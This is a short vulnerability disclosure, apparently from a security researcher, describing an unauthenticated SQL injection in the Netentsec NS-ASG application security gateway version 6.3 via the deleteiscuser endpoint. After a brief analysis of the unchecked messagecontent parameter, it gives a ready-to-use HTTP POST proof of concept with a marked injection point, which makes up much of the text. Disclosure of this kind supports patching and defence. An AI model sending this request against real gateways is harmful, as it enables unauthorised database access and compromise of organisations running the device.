Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/


version:6.3 Vulnerability Path ： /protocol/iscuser/deleteiscuser.php


The analysis is as follows:
Accept the $UserId variable through the variable messagecontent, then iterate over the $UserId variable and substitute it directly into the sql statement without doing any checks. Causes unauthorized sql injection
<img width="596" alt="图片" src="https://github.com/charliecatsec/cve1/assets/171440363/0833d188-2271-4966-ad2d-5839f71206d4">

Poc：
```
POST /protocol/index.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 69

jsoncontent={"protocolType":"deleteiscuser","messagecontent":["1*"]}
```
<img width="755" alt="图片" src="https://github.com/charliecatsec/cve1/assets/171440363/071ecc00-f1f9-411b-95b4-e1a68234b0aa">
<img width="731" alt="图片" src="https://github.com/charliecatsec/cve1/assets/171440363/aa284d20-c0aa-4086-91fb-6ab0a81c6a93">


